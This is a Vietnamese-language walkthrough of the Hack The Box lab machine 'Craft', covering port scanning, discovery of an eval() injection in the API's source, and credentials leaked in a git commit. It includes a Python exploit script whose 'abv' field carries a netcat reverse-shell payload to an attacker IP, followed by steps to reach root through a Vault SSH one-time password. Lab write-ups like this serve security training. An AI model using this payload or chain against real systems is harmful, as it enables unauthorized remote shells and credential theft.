<img width="1905" height="973" alt="image" src="https://github.com/user-attachments/assets/88459c31-7034-486d-ac51-5f4f7b538cc0" /><img width="1908" height="1024" alt="image" src="https://github.com/user-attachments/assets/6ec5a65a-b5ff-496e-b4cc-c9d70ba6e195" /># Craft

<img width="1488" height="808" alt="image" src="https://github.com/user-attachments/assets/e5add51d-e476-4c6e-9e6c-c3d5e35a6ce8" />

Tôi sử dụng nmap để quét các port:

```
sudo nmap 10.129.8.107 -Pn -sV -sC -p- --min-rate=200 -T 4 -oN mediumlab -v

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
443/tcp  open  ssl/http nginx 1.15.8
| tls-nextprotoneg: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
| Issuer: commonName=Craft CA/organizationName=Craft/stateOrProvinceName=New York/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-02-06T02:25:47
| Not valid after:  2020-06-20T02:25:47
| MD5:     0111 76e2 83c8 0f26 50e7 56e4 ce16 4766
| SHA-1:   2e11 62ef 4d2e 366f 196a 51f0 c5ca b8ce 8592 3730
|_SHA-256: 8828 6ef6 f2bb 87e6 58a3 f3ba 1ddf 15ef 8e97 4f3d cd81 237a c6c1 e036 3d6b 863e
| tls-alpn: 
|_  http/1.1
|_http-title: Gogs
|_http-server-header: nginx/1.15.8
| http-methods: 
|_  Supported Methods: HEAD
6022/tcp open  ssh      Golang x/crypto/ssh server (protocol 2.0)
| ssh-hostkey: 
|_  2048 5b:cc:bf:f1:a1:8f:72:b0:c0:fb:df:a3:01:dc:a6:fb (RSA)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Và đây là giao diện của website:

<img width="1908" height="1024" alt="image" src="https://github.com/user-attachments/assets/e894bc3a-f634-49ce-827a-6bf6d61d5cf2" />

Tôi dùng gospider để tìm kiếm thì có thu được 1 domain và 2 subdomain:

```
gospider -s "https://10.129.8.107/" -o output -c 10 -d 1
[url] - [code-200] - https://10.129.8.107/
[href] - https://10.129.8.107/static/css/font-awesome-4.1.0.min.css
[href] - https://10.129.8.107/static/css/bootstrap-3.1.1.min.css
[href] - https://10.129.8.107/static/css/bootstrap-theme-3.1.1.min.css
[href] - https://10.129.8.107/static/css/layout.main.css
[href] - https://10.129.8.107/static/css/main.css
[href] - https://10.129.8.107/static/css/main.responsive.css
[href] - https://10.129.8.107/static/css/main.quickfix.css
[href] - https://10.129.8.107/static/ico/favicon.png
[href] - https://10.129.8.107/static/ico/apple-touch-icon-144-precomposed.png
[href] - https://10.129.8.107/static/ico/apple-touch-icon-114-precomposed.png
[href] - https://10.129.8.107/static/ico/apple-touch-icon-72-precomposed.png
[href] - https://10.129.8.107/static/ico/apple-touch-icon-57-precomposed.png
[href] - https://10.129.8.107/
[href] - https://api.craft.htb/api/
[href] - https://gogs.craft.htb/
[javascript] - https://10.129.8.107/static/js/libs/modernizr-2.8.2.min.js
[javascript] - https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js
[javascript] - https://10.129.8.107/static/js/libs/bootstrap-3.1.1.min.js
[javascript] - https://10.129.8.107/static/js/plugins.js
[javascript] - https://10.129.8.107/static/js/script.js
[url] - [code-200] - https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js
[url] - [code-200] - https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.js
[url] - [code-200] - https://10.129.8.107/static/js/libs/bootstrap-3.1.1.min.js
[url] - [code-200] - https://10.129.8.107/static/js/script.js
[url] - [code-200] - https://10.129.8.107/static/js/plugins.js
[url] - [code-200] - https://10.129.8.107/static/js/libs/modernizr-2.8.2.min.js
[linkfinder] - [from: https://10.129.8.107/static/js/libs/modernizr-2.8.2.min.js] - text/css
[linkfinder] - https://10.129.8.107/static/js/libs/text/css
[linkfinder] - https://10.129.8.107/text/css
```

<img width="1909" height="1029" alt="image" src="https://github.com/user-attachments/assets/6073e9e8-f33f-4780-9079-8391edd6add2" />

Ở `https://gogs.craft.htb/Craft/craft-api` thì tìm được src code của website:

<img width="949" height="1019" alt="image" src="https://github.com/user-attachments/assets/bda68c0d-96bb-40c5-90f0-06fe8b532d10" />

Khi tôi tra các hàm nguy hiểm trong đoạn src code thì tìm thấy `eval()` nhận tham số `abv` thì người dùng khi tạo `brew`:

<img width="1216" height="938" alt="image" src="https://github.com/user-attachments/assets/14a7f387-7530-48d8-9e93-71041ffec5fe" />

Để thêm được `brew` thì cần đăng nhập và lấy được token:

<img width="900" height="430" alt="image" src="https://github.com/user-attachments/assets/c31070e5-d71e-476d-98fd-e20e79c7c3f5" />

Check lại commit thì tôi tìm được username và password để login, khi login thì có được token để tạo `brew`:

<img width="1886" height="1012" alt="image" src="https://github.com/user-attachments/assets/d5f68081-6f31-451f-8220-a843802e65e7" />

Dưới đây là tôi tạo thử `brew` mới:

<img width="1516" height="691" alt="image" src="https://github.com/user-attachments/assets/c604a271-0022-41ef-a3a7-7eceab4e99fe" />

<img width="1481" height="823" alt="image" src="https://github.com/user-attachments/assets/d4951263-092a-455b-b4a0-dfee0caf3393" />

Cải tiến lại file `test.py` bằng cách thêm payload vào:

```
import requests
import json
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
response = requests.get('https://api.craft.htb/api/auth/login', auth=('dinesh','4aUh0A8PbVJxgd'), verify=False)
json_response = json.loads(response.text)
token = json_response['token']
headers = { 'X-Craft-API-Token': token, 'Content-Type': 'application/json' }
response = requests.get('https://api.craft.htb/api/auth/check', headers=headers, verify=False)
print(response.text)
print("Create bogus ABV brew")
brew_dict = {}
brew_dict['abv'] = "__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.40 1234 >/tmp/f')"
brew_dict['name'] = 'bullshit'
brew_dict['brewer'] = 'bullshit'
brew_dict['style'] = 'bullshit'
json_data = json.dumps(brew_dict)
response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
print(response.text)
```

Bật nc lên và chạy file test.py là đã có reverse shell, tôi lấy được cả username và password của mysql:

<img width="1905" height="973" alt="image" src="https://github.com/user-attachments/assets/973724fd-8634-4642-b7ad-50ad2f4f9f27" />

Nhưng lại không chạy được lệnh `mysql`, tôi dùng python kết nối đến thay vì chạy mysql:

<img width="1883" height="560" alt="image" src="https://github.com/user-attachments/assets/76726ea9-5382-40d9-af55-7fbec27e2f6f" />

Ở bảng `user` thì có 3 user, đối với user dinesh và gilfoyle thì tôi có thể đăng nhập vào được `gogs.craft.htb`, đối với user gilfoyle thì tôi thấy có repo `craft-infra` và có chứa `.ssh` ở đó:

<img width="936" height="964" alt="image" src="https://github.com/user-attachments/assets/f19cc84b-b305-49dd-a312-bfb4ae68e231" />

Ở đây đòi thêm cả passphrase, tôi điền bừa `ZEU3N8WNM2rh4T` vào thì được:

<img width="795" height="605" alt="image" src="https://github.com/user-attachments/assets/ad180ee1-63fc-4f05-9f4b-a45fdd4f5083" />

<img width="852" height="997" alt="image" src="https://github.com/user-attachments/assets/771d833b-95e9-48a4-aaab-a209ad842655" />

Ở đây thì tôi lại để ý đến `.vault-token`, tôi tra mạng và tìm cách sử dụng:

<img width="1875" height="1002" alt="image" src="https://github.com/user-attachments/assets/3bd727a8-1d22-4268-a3db-3d69654b29b8" />

Tôi dùng `vault secrets list` để liệt kê các mục, dùng `vault read ssh/roles/root_otp ` để đọc cấu hình với user là root và sử dụng otp để xác thực, sau đó là dùng `vault write ssh/creds/root_otp ip=10.129.8.107` để lấy otp là key và cuối cùng là ssh vào với user là root.



